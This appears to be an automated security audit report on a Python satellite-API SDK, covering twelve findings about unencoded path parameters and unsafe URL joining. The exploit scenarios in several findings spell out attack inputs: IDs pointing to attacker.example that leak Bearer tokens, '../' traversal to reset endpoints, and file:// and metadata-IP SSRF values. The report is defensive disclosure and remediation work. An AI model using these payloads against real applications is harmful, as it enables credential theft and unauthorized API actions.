# Claude Security results

This is a whole-repository scan of `satvu-api-sdk` (`/Users/tobiasreinicke/Documents/repos/satvu-api-sdk`) at commit `2b33f137989f91a114bcd66a2ed7fcfc9997352a` on `main`. It started 2026-10-06 12:47 UTC and ran at `medium` effort, focused on production code an attacker can reach. **12 findings** survived verification: 0 CRITICAL, 0 HIGH, 9 MEDIUM and 3 LOW. All of them need an application built on the SDK to pass caller-influenced text, such as a contract, item or webhook id, into an SDK method.

**The twelve come down to two root causes, and fixing both closes all of them.**

- **Path parameters are not encoded.** The generated service methods insert path parameters into the request URL with a plain `.format()` and no percent-encoding. The type hints say `UUID`, but nothing checks that at runtime. This is F2 and F5 to F12, raised at the generator template (F9), at the separate streaming code path (F12), and at the generated services it produces.
- **Two adapters turn a path into an absolute URL.** The stdlib and urllib3 HTTP adapters check for an absolute URL before stripping the leading `/`, then `urljoin` the result. A path parameter starting with `https://` therefore replaces the API host, and the request goes there with the `Authorization: Bearer` header. This is F1, F3 and F4.

Percent-encoding path parameters in the generator, plus an origin check in the adapters before the token is attached, fixes all twelve.

## Coverage

The tracked tree has 482 files. Because it is large, the scan focused on production code an attacker can reach. Tests, fixtures, mocks and generated build output were consulted as background rather than audited, and a dedicated secrets pass still ran. The inventory was asked for about 20 components of roughly 25 files each, with at most 24 kept, and it returned **16 components**:

- `http-adapters` (`src/satvu/http`)
- `sdk-core-auth` (`src/satvu/core.py`, `src/satvu/auth.py` and their tests)
- `response-parsing` (`src/satvu/shared`)
- `catalog-service-api` and `catalog-service-models` (`src/satvu/services/catalog`)
- `otm-service-api` and `otm-service-models` (`src/satvu/services/otm`)
- `cos-service`, `id-service`, `reseller-service`, `policy-service`, `wallet-service` (the matching `src/satvu/services/*` packages)
- `sdk-builder-generator` (`src/builder`)
- `examples` (`examples`)
- `dagger-ci` (`.dagger`)
- `dev-scripts` (`scripts`)

Each component was researched for four categories: injection and input handling, authentication and authorization, memory and unsafe operations, and cryptography and secrets. One breadth sweep also covered the files outside the components for every kind of vulnerability. Almost every group's researchers, including all of the SDK and service groups, were not asked about memory-safety bugs. The workflow decided this from the inventory's language before they were briefed, because it took that code to be all in managed languages. All 50 researchers that were dispatched returned. The panel finished in one verification run, and no candidate was lost on the way.

**Every top-level directory is accounted for.** Each one was either scanned or skipped on purpose. The skipped areas and the inventory's reasons:

- `github-workflows` (`.github`): "CI workflow/dependabot config, not application code; low-value for a code-focused security review"
- `docs` (`docs`): "Markdown documentation only, no executable code"
- `services-test-infra` (`src/satvu/services/conftest.py`, `example_cache.py`, `schema_conformance.py`): test fixtures and request-body conformance checks used only by the generated test suite and excluded from the shipped wheel

The researchers reported what they did not read in full. That is almost entirely the `*_test.py` files under `src/satvu` and `src/builder`, left as background under the focus, plus the two `uv.lock` files. Checked against the 451 tracked files inside the components, 356 were read to a conclusion, 95 sit under a path a researcher declared not reached, and none went unaccounted. The other 31 tracked files are the skipped areas and root files no component claims.

## Findings

### F1 — Relative path rebuilt into an absolute URL in the urllib3 adapter: the Bearer token goes to a host named in a path parameter (MEDIUM, confidence high)

**Impact.** The OAuth bearer token leaks to an attacker-chosen host, giving API access as the application's SatVu account.

**Where.** `src/satvu/http/urllib3_adapter.py:198` in `Urllib3Adapter.request` — CWE-918 (also CWE-522)

**What.** This has the same flaw as StdlibAdapter. The absolute-URL check at line 197 runs on the '/'-prefixed path built by the services, but line 198 strips the '/' and urljoins. A path parameter such as contract_id='https://attacker.example/x?' (catalog contract_id: str) therefore becomes the request URL, and PoolManager.request sends it with the Authorization header added at line 215. Also CWE-522: The urllib3 adapter uses the same flawed pattern: the startswith check runs on the un-stripped url, then urljoin is applied to the lstripped value. A contract_id such as "https://attacker.example/x" coming through WalletService.get_credit_balance (api.py:57) therefore yields full_url on the attacker's host. The Authorization bearer token added at line 215 goes with it in pool_manager.request.

**Exploit scenario.** In an environment where urllib3 is installed but httpx and requests are not (urllib3 is fourth in the auto-detect order), or where the integrator chose backend='urllib3', an application forwards a user-supplied contract_id to sdk.catalog.landing_page(). With contract_id='https://attacker.example/x?', the SDK sends GET https://attacker.example/x?/ with 'Authorization: Bearer <token>', and the attacker captures the application's API token.

**Preconditions.**
- The application passes attacker-influenced text as the first path parameter (for example catalog contract_id)
- Urllib3Adapter is selected: chosen explicitly, or picked by auto-detection because httpx, httpx2 and requests are not installed

**Fix.** Join base_url and the path without lstrip+urljoin, or check that the resolved URL keeps the base_url scheme and host and reject it otherwise. Percent-encode path parameters in the generated service code. Also CWE-522: Apply the same fix as for the stdlib adapter: normalise the path first, refuse absolute or scheme-relative values (or concatenate rather than urljoin), check the final origin against base_url before adding Authorization, and URL-encode or UUID-validate path parameters in generated endpoints.

**Verification.** 3/3 lens verifiers confirmed.

### F2 — Unencoded contract_id in the request path lets the caller choose the destination host, and the SDK bearer token goes with the request (stdlib/urllib3 backends) (MEDIUM, confidence high)

**Impact.** Theft of the application's SatVu OAuth bearer token (full API access as the integrating account until expiry, including spending credits). On all backends, the integrator's token can also be used for authenticated GETs to arbitrary SatVu API paths, with partial reflection of the response data in error messages.

**Where.** `src/satvu/services/wallet/api.py:57` in `WalletService.get_credit_balance` — CWE-918

**What.** contract_id is typed as UUID, but nothing checks that at runtime, and it goes into the request path with no URL-encoding (the builder template in endpoint_module.py.jinja uses a plain .format(), and no service calls quote() anywhere). The stdlib and urllib3 adapters only test for an absolute URL before stripping the leading '/', so an attacker-chosen 'https://host/...' value becomes the full request URL and the Authorization: Bearer header is attached to it.

**Exploit scenario.** A reseller portal calls sdk.wallet.get_credit_balance(request.args['contract_id']). The attacker submits contract_id='https://attacker.example/c?'. The SDK builds url '/https://attacker.example/c?/credit'. The stdlib adapter's startswith check fails because of the leading '/', lstrip removes the '/', and urljoin('https://api.satellitevu.com/wallet/v1/', 'https://attacker.example/c?/credit') returns 'https://attacker.example/c?/credit'. urlopen sends the GET with 'Authorization: Bearer <app OAuth token>', and the attacker records the token. They can then call every SatVu API (catalog, ordering, tasking, reseller) as the application until the token expires. On every backend, values such as '../../otm/v2/<id>/...?' send authenticated GETs to other SatVu API paths. Those responses fail CreditBalanceResponse validation, and parse_response puts the data keys and the pydantic error text (which includes input values) into the ValueError it raises.

**Preconditions.**
- The integrating application passes a string influenced by an untrusted user (for example from a query parameter or form field) as contract_id to get_credit_balance, trusting the UUID type hint.
- The HTTP backend is stdlib or urllib3. stdlib is what 'auto' picks on a default install with only pydantic, and urllib3 is picked when it is present without httpx/requests (for example via botocore). With the httpx and requests backends, '../' and '?' / '#' still change the path and query on api.satellitevu.com.

**Fix.** In the endpoint template, coerce and encode path parameters: str(UUID(contract_id)) for UUID-typed params, and urllib.parse.quote(str(value), safe='') for all others. In the stdlib/urllib3 adapters, strip the '/' before checking for an absolute URL, or better, reject any final URL whose scheme/netloc differs from base_url before attaching the Authorization header.

**Verification.** 3/3 lens verifiers confirmed.

### F3 — urllib3 adapter uses the same lstrip+urljoin join, so a scheme-prefixed catalog contract_id sends the Bearer token to an attacker host (MEDIUM, confidence high)

**Impact.** The integrator's SatVu OAuth access token is exposed to an attacker-chosen host, giving the attacker the service account's API privileges for the token's lifetime.

**Where.** `src/satvu/http/urllib3_adapter.py:215` in `Urllib3Adapter.request` — CWE-522

**What.** The unencoded contract_id from CatalogService (api.py:98 and every other method) reaches the urllib3 adapter as f"/{contract_id}/...". The adapter strips the leading '/' after its absolute-URL check and urljoins the result, so 'https://attacker/...' replaces base_url. It then adds the Bearer token and calls PoolManager.request on that host without checking the origin.

**Exploit scenario.** In an application where urllib3 is the auto-selected or configured backend, an attacker supplies contract_id="https://attacker.example/c" to any catalog call, for example post_search or get_item. The request, with 'Authorization: Bearer <token>', goes to attacker.example. With an http:// prefix it goes in cleartext. The attacker reuses the captured token against the SatVu API.

**Preconditions.**
- The integrating application passes attacker-influenced input as contract_id
- The urllib3 backend is selected, either explicitly or by auto-detection when urllib3 is installed but httpx, httpx2 and requests are not

**Fix.** Percent-encode path parameters in the generated client, and after joining URLs enforce that the target's scheme and netloc match base_url before adding the Authorization header. The requests and httpx adapters already keep relative paths on the base host and can serve as the reference.

**Verification.** 3/3 lens verifiers confirmed.

### F4 — Relative path rebuilt into an absolute URL: a path segment starting with a scheme sends the Bearer token to any host (or a file:// read) (MEDIUM, confidence medium)

**Impact.** The SatVu OAuth bearer token leaks to a host the attacker picks, giving API access as the application's account (confidentiality and integrity of orders, plus spend). The file:// scheme also allows local file reads that may be returned to the caller.

**Where.** `src/satvu/http/stdlib_adapter.py:201` in `StdlibAdapter.request` — CWE-918 (also CWE-522)

**What.** The service layer marks every path as relative by putting a '/' in front of it (catalog: url=f"/{contract_id}/search", with contract_id typed str and never encoded). The adapter checks for an absolute URL on the original string, then strips the leading '/' and calls urljoin. If the caller-supplied segment starts with 'https://host' or 'file:///', urljoin returns it as an absolute URL, so urlopen sends the request, with the Authorization header added at line 218, to that host or local file. Also CWE-522: The untrusted source is contract_id in WalletService.get_credit_balance. It is interpolated unencoded into "/{contract_id}/credit" (api.py:57). The adapter checks for an absolute URL at line 200, but before it strips the leading '/'. So "/https://attacker.example/x/credit" passes the check, and after lstrip urljoin returns the attacker's absolute URL unchanged (CPython urljoin returns `url` when it has a netloc or a different scheme). The Authorization: Bearer token added at line 218 then goes to that host via urlopen at line 239.

**Exploit scenario.** An application built on the SDK passes a user-supplied contract identifier to sdk.catalog.get_search(contract_id=...), as examples/catalog.py does with its own value. The attacker submits contract_id='https://attacker.example/c?'. The URL becomes '/https://attacker.example/c?/search', the adapter turns it into 'https://attacker.example/c?/search&limit=10', and urlopen sends GET to attacker.example with 'Authorization: Bearer <app OAuth token>'. The attacker now holds the application's SatVu API token and can read orders or place paid tasking orders. With contract_id='file:///path/to/secret.json#' the stdlib adapter instead reads a local file. The status is -1, so the service does not raise. If the file is JSON its parsed content comes back from the SDK call; if not, the first 200 characters land in the JsonDecodeError body_preview.

**Preconditions.**
- The application passes attacker-influenced text as a path parameter that comes first in the URL (catalog contract_id is typed str; UUID-typed parameters elsewhere are not checked at runtime)
- StdlibAdapter is in use. It is the auto-selected backend when httpx, httpx2, requests and urllib3 are absent, which is the default 'pip install satvu' install

**Fix.** Do not strip the leading '/' before joining. Build the URL by string concatenation of base_url and the path, or check after urljoin that the scheme and netloc of the result equal those of base_url, and reject anything else. Allow only http/https schemes before calling urlopen, and attach Authorization only when the final host matches base_url. In the generated services, percent-encode path parameters with urllib.parse.quote(str(v), safe=''). Also CWE-522: In the adapter, strip the leading slashes first and then reject any value that parses as having a scheme or netloc. Or build the URL by plain concatenation as requests_adapter does, and check that the final URL's scheme and host match base_url before attaching Authorization. In the generated endpoint template, URL-encode path parameters (urllib.parse.quote(str(v), safe='')), or coerce them with UUID(str(contract_id)) before interpolation.

**Verification.** 2/3 lens verifiers confirmed.

### F5 — Unencoded item_id in streaming download URL lets the caller's input pick which API resource is written to disk (MEDIUM, confidence medium)

**Impact.** The attacker gets imagery or JSON data from resources the application did not authorize, read through the app's own SatVu credentials.

**Where.** `src/satvu/services/cos/api.py:447` in `CosService.download_order_item_to_file` — CWE-22 (also CWE-918)

**What.** The untrusted item_id goes into the request path without quoting, so '../' segments and '?' redirect the authenticated GET to another path on the API host. stream_to_file (core.py:316-318) then writes any non-4xx/5xx response body to output_path without checking status or Content-Type. Also CWE-918: Same unencoded item_id interpolation as download_order_item, in the streaming variant. Here every non-4xx/5xx response body from the redirected path is written straight to output_path by stream_to_file. Status code and Content-Type are never checked, so any authenticated GET response the attacker steers the request to ends up in the file the app will serve as the download.

**Exploit scenario.** An application lets users download imagery from orders it has authorized for them by calling download_order_item_to_file(contract_id, authorized_order_id, user_item_id, tmp_path) and serving tmp_path back. With user_item_id='../<other_order_id>/<item>', or a deeper '../' chain plus a trailing '?' to reach other services' GET endpoints, the app's token fetches a resource outside the authorized order. The response is saved and returned to the attacker as a successful download.

**Preconditions.**
- The integrating application passes an untrusted string as item_id
- The application returns the written file to the requester

**Fix.** Percent-encode path parameters (quote(str(item_id), safe='')) in the generated template. In stream_to_file, check that the final response is 200 with an expected binary Content-Type before writing. Also CWE-918: URL-encode item_id (and stringify and validate the UUID parameters) before building the path. Also check the status code and the expected Content-Type before streaming the body to disk.

**Verification.** 2/3 lens verifiers confirmed.

### F6 — Webhook id is put into the URL path without encoding, so rotate_webhook_signing_key can POST to /client/reset or other endpoints (MEDIUM, confidence medium)

**Impact.** Integrity and availability: an attacker who controls only a webhook id can make the application run state-changing POSTs on other SatVu API endpoints with its credentials, for example resetting its client secret, which causes a denial of service for the integration.

**Where.** `src/satvu/services/id/api.py:352` in `IdService.rotate_webhook_signing_key` — CWE-22 (also CWE-918)

**What.** The caller-supplied `id` (annotated UUID but never checked or converted) goes into the request path verbatim. A string containing `../`, `#` or `?` changes which endpoint the authenticated POST reaches. Every adapter resolves dot segments (urljoin in stdlib/urllib3, URL normalisation in httpx/requests) and drops the fragment, and the Bearer token is still attached. Also CWE-918: The `id` argument is only type-hinted as UUID and is never validated or percent-encoded. It goes verbatim into the request path, and the adapter normalises that path (stdlib/urllib3 `urljoin(self.base_url + '/', url.lstrip('/'))` resolves `../`) before sending it with the integrator's bearer token. A string id holding `../` and `?` therefore sends the request to an endpoint of the caller's choice instead of `/webhooks/{id}/rotate`. get_webhook (200), delete_webhook (235), edit_webhook (281) and test_webhook (387) have the same flaw.

**Exploit scenario.** An integrating application (for example a reseller portal) lets its end users rotate a webhook signing key by id and passes the request value to sdk.id.rotate_webhook_signing_key(id). The attacker submits id="../client/reset#". The path becomes /id/v3/webhooks/../client/reset#/rotate, which resolves to POST https://api.satellitevu.com/id/v3/client/reset with the application's Bearer token. That rotates the application's M2M client secret and cuts off its API access. id="../client#" reaches POST /client instead (create M2M client), and "../../<service>/..." reaches other services on the same host with the same token.

**Preconditions.**
- The integrating application passes an untrusted string as the webhook id (the UUID annotation is not enforced at runtime)
- The application's token is allowed to call the traversed-to endpoint

**Fix.** Validate path parameters before building the URL, e.g. id = UUID(str(id)), or percent-encode each path segment with urllib.parse.quote(str(id), safe=""). Make this change in the builder template so that every generated path parameter (api.py lines 200, 235, 281, 352, 387 and other services) is covered. Also CWE-918: Coerce path parameters before building the URL (e.g. `id = UUID(str(id))`) or percent-encode every path segment with `urllib.parse.quote(str(id), safe='')`. Fix this in the endpoint_module.py.jinja template so all generated services get it.

**Verification.** 2/3 lens verifiers confirmed.

### F7 — Unencoded contract_id turns into an absolute URL in the stdlib/urllib3 adapters, so the request and its Bearer token go to an attacker-chosen host (MEDIUM, confidence medium)

**Impact.** The SatVu OAuth access token can be stolen (full API access as the integrating account). The bug also allows SSRF to arbitrary hosts and, with stdlib, to file:// URLs, with the response handed back to the caller.

**Where.** `src/satvu/services/catalog/api.py:98` in `CatalogService.landing_page` — CWE-918

**What.** Every catalog method puts the caller-supplied contract_id into the URL as the first path segment (`f"/{contract_id}..."`), typed as a plain `str` and never percent-encoded or validated. The stdlib and urllib3 adapters check for a scheme before running `url.lstrip("/")`, then pass the stripped value to urljoin. A contract_id such as `https://attacker.example` therefore becomes an absolute URL, and the adapter attaches `Authorization: Bearer <token>` to that request.

**Exploit scenario.** A multi-tenant or reseller app built on the SDK takes the contract ID from a query parameter or JSON body and calls sdk.catalog.get_collections(contract_id=...). On a base `pip install satvu`, which uses the stdlib adapter, or with urllib3, an attacker submits contract_id=`https://attacker.example/x#`. The SDK requests `https://attacker.example/x` with the app's OAuth Bearer token, and the attacker then uses that token against the SatVu APIs (orders, wallet, catalog) as the app's account. `http://` sends the token in cleartext. With stdlib, `http://169.254.169.254/...` or `file:///...` also reach internal or local resources, and JSON responses come back to the caller (non-200 bodies are returned raw).

**Preconditions.**
- The integrating application passes an attacker-influenced string as contract_id (catalog types it as str; other services use UUID)
- The stdlib adapter (the default when no optional HTTP extra is installed) or the urllib3 adapter is in use; the httpx and requests adapters keep the request on the base host

**Fix.** Percent-encode every path parameter with urllib.parse.quote(value, safe="") in the generated templates, and reject IDs that do not match the expected format (contract_id should be a UUID). In the stdlib and urllib3 adapters, stop combining lstrip with urljoin: build full_url by string concatenation onto base_url, then confirm that the resulting scheme and netloc match base_url before attaching the Authorization header.

**Verification.** 2/3 lens verifiers confirmed.

### F8 — Path parameters go into the request URL unencoded, so a contract_id beginning with 'https://' sends the Bearer token to an attacker-chosen host (stdlib/urllib3 backends) (MEDIUM, confidence medium)

**Impact.** The integrator's API access token leaks to an attacker-controlled host, letting the attacker act as that account (paid tasking orders, data access) until the token expires. Via the non-leading IDs, an app's client-side contract scoping can be bypassed on the API host.

**Where.** `src/satvu/services/otm/api.py:119` in `OtmService.list_orders` — CWE-918

**What.** contract_id, order_id, id and series_id are only type-hinted as UUID. The code never checks or percent-encodes them before f-string interpolation into the request path. The stdlib and urllib3 adapters then strip the leading '/' and urljoin the result onto base_url, so a contract_id such as 'https://attacker.example/x#' becomes an absolute URL that replaces the SatVu host, and the adapter attaches 'Authorization: Bearer <token>' to that request.

**Exploit scenario.** An integrating app (for example a reseller portal) takes the contract ID as a string from a request or tenant setting and calls sdk.otm.list_orders(contract_id=value). The attacker supplies 'https://attacker.example/c#'. The url becomes '/https://attacker.example/c#/tasking/orders/'. The stdlib adapter strips the leading slash, and urljoin('https://api.satellitevu.com/otm/v2/', 'https://attacker.example/c#/tasking/orders/') returns 'https://attacker.example/c'. urlopen then sends the GET with the integrator's OAuth Bearer token to the attacker, who can replay it against the OTM API until it expires (create or cancel orders, read imagery). 'http://...' also works and sends the token in cleartext. On every backend, the non-leading IDs (order_id, series_id, id) also accept '../' and '?'/'#'. The URL libraries resolve '../' segments, so for example order_id='../../../<other-contract>/tasking/orders/<id>' escapes the contract scope the app intended and acts with the app's token on a different contract's resources.

**Preconditions.**
- The integrating application passes an attacker-influenced string (not a uuid.UUID object) as contract_id. For the traversal variant, it passes such a string as order_id/series_id/id.
- The token-to-foreign-host variant needs the stdlib or urllib3 backend (stdlib is the default when no optional HTTP extra is installed). The httpx and requests backends keep the host and only allow path/query manipulation.

**Fix.** Validate path parameters as UUIDs (UUID(str(v))) or percent-encode each segment with urllib.parse.quote(str(v), safe='') in the generated URL template. In the adapters, do not urljoin caller paths that resolve to a different scheme/host than base_url; reject or force them to be relative.

**Verification.** 2/3 lens verifiers confirmed.

### F9 — Generated SDK methods put path parameters into the request URL without percent-encoding, so a caller-supplied ID can redirect the bearer-authenticated request (MEDIUM, confidence medium)

**Impact.** Leak of the consuming application's SatVu OAuth bearer token to an attacker-chosen host on the stdlib and urllib3 backends. With every backend, the application's credentials can be aimed at unintended SatVu API endpoints (a confused deputy).

**Where.** `src/builder/templates/endpoint_module.py.jinja:42` in `url (Jinja macro)` — CWE-918

**What.** The url macro builds every endpoint URL as "<path>".format(param=param) with the raw argument value and never percent-encodes it. Whatever string a calling application passes as a path parameter (catalog contract_id/collection_id/item_id are typed str; UUID hints are not enforced at runtime) goes into the path the HTTP adapter resolves. The bearer token is attached to that request (stdlib_adapter.py:216-218, urllib3_adapter.py:213-215). With the stdlib and urllib3 backends, the URL is resolved by urljoin(base_url + '/', url.lstrip('/')) (stdlib_adapter.py:201, urllib3_adapter.py:198). An absolute URL in the first path segment therefore replaces the SatVu host, and ../ segments are collapsed for every backend.

**Exploit scenario.** An application built on the published satvu SDK passes a value from its own user (a tenant/contract selector, or a STAC item or collection id from a URL) into sdk.catalog.landing_page(contract_id=...) or get_item(...). The attacker supplies contract_id="https://attacker.example/x#". The generated code builds url="/https://attacker.example/x#". The stdlib adapter (the default when httpx and requests are not installed) lstrips the slash, and urljoin returns https://attacker.example/x. urlopen then sends the request with 'Authorization: Bearer <app OAuth token>' to the attacker, who can use the token against the application's SatVu account (catalog, orders, tasking, wallet). With any backend, item_id="../../../<other path>#" re-targets the authenticated request to another SatVu API path the application never meant to call.

**Preconditions.**
- A consuming application passes attacker-influenced strings into a generated method's path parameter
- For the cross-host token leak: the SDK resolves to the stdlib or urllib3 adapter (the default on a minimal pip install satvu with no httpx/requests present). The ../ re-targeting within the API works with any adapter

**Fix.** In the url macro, emit quote(str(param), safe="") for every path parameter and import urllib.parse.quote in the generated module. As defence in depth, make the stdlib and urllib3 adapters refuse a joined URL whose scheme or host differs from base_url, instead of trusting urljoin.

**Verification.** 2/3 lens verifiers confirmed.

### F10 — Unencoded collection_id/item_id/contract_id let '../', '?' and '#' redirect catalog calls to arbitrary SatVu API paths with the app's token (LOW, confidence medium)

**Impact.** Confused-deputy access to other SatVu API resources and contracts that the application's credentials can reach, which bypasses the application's own per-user scoping. The impact stays within the SatVu API host and is bounded by the server-side authorisation of the application's token.

**Where.** `src/satvu/services/catalog/api.py:287` in `CatalogService.get_item` — CWE-22 (also CWE-918)

**What.** Path parameters taken from the caller are interpolated straight into the request path. Nothing percent-encodes them or rejects '/', '..', '?' or '#'. Dot segments are resolved on the client (urljoin in stdlib/urllib3, URL normalisation in requests/urllib3 parse_url and httpx), and '?'/'#' cut off the rest of the intended path. An ID value can therefore leave /catalog/v1/{contract}/ and reach any endpoint on api[.env].satellitevu.com, carrying the application's bearer token. Also CWE-918: collection_id and item_id are caller-supplied strings placed raw into the request path. Dot segments are resolved by urljoin (stdlib/urllib3) and by URL normalisation in requests/urllib3.parse_url and httpx. '?' or '#' cut off the rest of the path. As a result, an ID value can send the token-bearing request to any path on api.satellitevu.com, including other contract IDs and other services such as /cos, /otm, /wallet and /id.

**Exploit scenario.** An application fixes contract_id for each customer but takes item_id from the end user, for example from a link in a catalog UI, and calls sdk.catalog.get_item(contract_id=tenant_contract, collection_id='primary', item_id=user_value). The attacker sends item_id='../../../../../<other_contract>/collections/primary/items/<x>' or '../../../../../otm/v2/<contract>/...?'. The SDK resolves this to a different contract or API on the same host and sends it with the application's token. The response comes back to the application: raw JSON when the status is not 200, or a model with extra='allow', or a ValueError that includes pydantic input details. The attacker can read data the application meant to keep from them. post_collection_search does the same with a POST and a JSON body sent to the redirected path.

**Preconditions.**
- The integrating application passes an untrusted value as contract_id, collection_id or item_id
- The application's credential can access resources beyond what the end user should see, and the application returns the response or error to the user

**Fix.** Encode each path parameter as a single segment (urllib.parse.quote(str(v), safe='')) in the endpoint template that generates api.py. Optionally reject values that are '.' or '..', or that contain '/', '?' or '#', before building the request. Also CWE-918: URL-encode every path parameter with quote(value, safe="") in the endpoint template, so '/', '?', '#' and '..' cannot change the path structure, and validate IDs against the expected pattern.

**Verification.** 2/3 lens verifiers confirmed. The panel lowered the severity from MEDIUM to LOW.

### F11 — item_id is interpolated into the download URL path without encoding, so '../', '?' and '#' change the request target (LOW, confidence medium)

**Impact.** Confused-deputy read: the attacker can bypass the application's per-order authorization, or make the SDK issue authenticated GETs to other API paths on the SatVu host using the integrating app's credentials.

**Where.** `src/satvu/services/cos/api.py:393` in `CosService.download_order_item` — CWE-22 (also CWE-918)

**What.** The caller-supplied item_id (a plain str, never percent-encoded anywhere in the SDK, since there is no quote() call in src/satvu) goes straight into the request path. The adapters then send it to the API host with the app's Bearer token. In the stdlib and urllib3 adapters, urljoin resolves dot segments on the client side (stdlib_adapter.py:201, urllib3_adapter.py:198), so a crafted item_id points the authenticated GET at any path on api.<env>.satellitevu.com. Also CWE-918: item_id is a free-form str that goes into the request path with no percent-encoding. The adapters then build the URL with urljoin (stdlib_adapter.py:201, urllib3_adapter.py:198), which resolves '../' segments, and httpx/requests normalise dot segments too. A '#' or '?' in item_id cuts off the '/download' suffix and the SDK's own query string. So an item_id from an untrusted end user can point the request, with the integrator's Bearer token, at a different order or any other GET endpoint on api.satellitevu.com.

**Exploit scenario.** A reseller or multi-tenant portal built on the SDK checks that the end user owns order O1, then calls sdk.cos.download_order_item(contract_id, O1, item_id=request.args['item']). The attacker sends item='../O2/ITEMX'. The URL /orders/v3/C/O1/../O2/ITEMX/download resolves to /orders/v3/C/O2/ITEMX/download, so the app's service-account token fetches an item from an order the app's ownership check never covered. Values like '../../../../id/v3/<path>?' reach GET endpoints of other services on the same host. Any non-200/202 2xx JSON comes back raw to the caller, and 200 bodies end up partly in the ValueError raised by parse_response.

**Preconditions.**
- The integrating application passes an untrusted string as item_id (contract_id and order_id are also unencoded but typed UUID)
- The attacker can see the downloaded content or the returned JSON through the application

**Fix.** Percent-encode every path parameter with urllib.parse.quote(str(v), safe='') in the generated endpoint template before building the URL. Also validate UUID-typed parameters at runtime (UUID(str(v))). Also CWE-918: Percent-encode every path parameter before interpolating it, e.g. quote(str(item_id), safe=""), in the endpoint template so all generated services get it. Optionally reject IDs containing '/', '..', '?' or '#'. Convert contract_id/order_id with UUID(str(x)) at runtime, since the type hints are not enforced.

**Verification.** 3/3 lens verifiers confirmed. The panel lowered the severity from MEDIUM to LOW.

### F12 — Streaming *_to_file methods put raw path parameters into the authenticated download URL (separate code path from the template) (LOW, confidence medium)

**Impact.** The application's credentials are aimed at unintended SatVu endpoints, or (stdlib/urllib3 backend, untyped contract_id input) the token leaks to an attacker host.

**Where.** `src/builder/ast_generator.py:206` in `ASTMethodBuilder._build_body` — CWE-918

**What.** The AST generator for streaming download methods builds url=<path>.format(name=name) from the raw arguments with no percent-encoding, and always sets follow_redirects=True. A caller-supplied item_id (typed str), or a non-UUID string passed as contract_id/order_id, re-targets the bearer-authenticated GET through urljoin dot-segment and absolute-URL resolution in the adapters. Fixing only the Jinja template would leave this path open.

**Exploit scenario.** An application passes a user-supplied item_id to sdk.cos.download_order_item_to_file(...). A value such as "../../../../<other SatVu path>#" makes the SDK send the application's bearer token in a GET to a different SatVu endpoint, and the response is streamed to the application's output path. On the stdlib or urllib3 backend, a string contract_id of "https://attacker.example/#" sends the token off-host.

**Preconditions.**
- A consuming application passes attacker-influenced strings into the streaming method's path parameters
- For an off-host leak: stdlib or urllib3 adapter, plus a non-UUID string reaching contract_id

**Fix.** Wrap each path-parameter value in a quote(str(x), safe="") call node (and add the urllib.parse import through add_imports_to_ast) instead of passing the bare ast.Name.

**Verification.** 2/3 lens verifiers confirmed.

## What was verified

The scan mapped the repository into components, built a threat model, and ran one researcher per component and category plus a breadth sweep. Each of the 46 candidates, merged into 21 distinct issues, then went to a three-voter panel that judged reachability, impact and defenses separately, and a finding needed two of three votes to survive. F1, F2, F3 and F11 were confirmed unanimously; the other eight by two of three. The panel's confirming voters rated F10 and F11 lower than the researchers had, and the lower ratings are the ones reported here. The scan only read code. It sent no requests and installed no backends, so every finding comes from reading the code, not from a demonstration. The stamp's verification status is `verified`.
